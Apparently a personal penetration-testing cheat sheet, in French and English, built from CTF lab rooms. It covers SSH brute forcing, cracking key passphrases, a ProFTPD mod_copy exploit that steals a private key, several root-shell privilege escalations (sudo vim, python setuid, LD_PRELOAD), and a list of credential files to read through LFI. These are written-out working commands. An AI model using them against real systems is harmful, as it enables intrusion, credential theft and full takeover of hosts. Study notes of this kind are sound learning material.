# ![](img/pentest_25.svg) Pentest

## Pentest AD
[Pentest AD MAP](https://www.xmind.net/m/5dypm8/)

## Enumerate local information from a Linux host

[LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
## Outils
### Gobuster

Source : [gobuster](https://www.le-hacking.fr/brute-force-url-gobuster/)

gobuster -h : 
```bash=
$ gobuster dir -u http://<ip>:<port> -w <wordlist>
```

Exemples :
```bash=
$ ./gobuster dir -u http://<ip>/ -w <wordlist>
```

### John2ripper

```bash=
$ john-the-ripper --wordlist=Outils/wordlist/rockyou.txt id_rsa_basic_hash.txt
```

Permet de retrouver la passphrase pour se connecter en ssh Ã  un user particulier.

### Hydra 

-l = user
<br/>-L = userlist
<br/>-p = password
<br/>-P = passwordlist

```bash=
hydra -l test -P /home/petibonum/Outils/wordlist/rockyou.txt <ip> ssh
```

user = test
<br/>wordlist = rockyou.txt

[Source](https://linuxtrack.net/viewtopic.php?id=654)

### Fuzzing

```bash=
wfuzz -c -z file,<file> --sc 200 -d "username=<user>&password=FUZZ" http://<ip>/<path>/
```
### ADB connect 

[Source](https://labs.f-secure.com/blog/hackin-around-the-christmas-tree/)
### SMB

Lets inspect one of the shares :
```bash=
smbclient //<ip>/anonymous
```

You can recursively download the SMB share too. Submit the username and password as nothing.
```bash=
smbget -R smb://<ip>/anonymous
```

### ProFTPD module mod_copy

Exemple : [Kenobi Room](https://tryhackme.com/room/kenobi)

PrÃ©requis : port 21

    ```bash=
    PORT   STATE SERVICE
    21/tcp open  ftp

    â”Œâ”€â”€(rootðŸ’€2d2359796bd4)-[/mnt/kenobiNFS]
    â””â”€# nc 10.10.253.117 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.253.117]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful

    mkdir /mnt/<name_folder>
    sudo mount <ip_target_machine>:/var /mnt/<name_folder>
    ls -la /mnt/<name_folder>

    cp /mnt/<name_folder>/tmp/id_rsa .
    sudo chmod 600 id_rsa
    ssh -i id_rsa kenobi@10.10.253.117
    ```

[Source](http://www.proftpd.org/docs/contrib/mod_copy.html)
## Escalade de privilÃ¨ge [GRAAL](https://tryhackme.com/room/linuxprivesc)

### Exemple TryHackMe

Exemple : 
* NÂ°1 : TryHackMe -> [SimpleCTF Room](https://tryhackme.com/room/simplectf)

    ```bash=
    $ sudo -l
    ans : User mitch may run the following commands on Machine:
    ans : (root) NOPASSWD: /usr/bin/vim
    $ sudo vim -c ':!/bin/sh'
    # ^[[2;2R^[]11;rgb:3030/0a0a/2424^G
    ans : /bin/sh: 1: ot found
    ans : /bin/sh: 1: 2R: not found
    # whoami
    ans : root
    ```

* NÂ°2 : TryHackMe -> [BasicPentesting Room](https://tryhackme.com/room/basicpentestingjt)
    ```bash=
    ssh -i /home/<user>/.ssh/id_rsa kay@<ip>
    ```
    Cette ligne permet de se connecter en ssh Ã  un user par l'intermÃ©diaire d'un autre user prÃ©sent sur la mÃªme machine.

* NÂ°3 : HackTheBox -> [CAP Room](https://app.hackthebox.eu/machines/Cap)

    ```bash=
    nathan@cap:~$ getcap -r / 2>/dev/null
    ans : /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
    ans : /usr/bin/ping = cap_net_raw+ep
    ans : /usr/bin/traceroute6.iputils = cap_net_raw+ep
    ans : /usr/bin/mtr-packet = cap_net_raw+ep
    ans : /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
    nathan@cap:~$/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    ans : root@cap:~#
    ```
    C'est bon, on est root sur la machine.

* NÂ°4 : TryHackMe -> [Advent of Cyber 2020](https://tryhackme.com/room/adventofcyber2)
    ```bash=
    python -c 'import pty; pty.spawn("/bin/bash")'
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```

### sudo -l

Check which environment variables are inherited (look for the env_keep options):

    ```bash=
    sudo -l
    ```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

    ```bash=
    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
    ```

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

    ```bash=
    sudo LD_PRELOAD=/tmp/preload.so program-name-here
    ```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

    ```bash=
    ldd /usr/sbin/apache2
    ```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

    ```bash=
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
    ```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

    ```bash=
    sudo LD_LIBRARY_PATH=/tmp apache2
    ```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

### Recherche FIND spÃ©cifique

Rechercher des fichiers avec l'autorisation SUID :
```bash=
find / -user root -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```


### LinPEAS - Linux Privilege Escalation Awesome Script

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    ```bash=
    git clone https://github.com/carlospolop/PEASS-ng.git
    wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
    ```
## Reverse Shell

[Reverse Shell examples](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

## LFI

 Linux system files that have sensitive information :
    ```bash=
    /etc/issue
    /etc/passwd
    /etc/shadow
    /etc/group
    /etc/hosts
    /etc/motd
    /etc/mysql/my.cnf
    /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
    /proc/self/environ
    /proc/version
    /proc/cmdline
    ```

### Outils d'encodage

[CyberChef](https://gchq.github.io/CyberChef/)

## Autres Sources

* [Reverse Shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* [SUID vs CAPABILITIES](https://mn3m.info/posts/suid-vs-capabilities/)
* [Linux Privilege Escalation](https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)
* [Linux Privilege Escalation with Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
* [Reverse Shell - Synetis](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
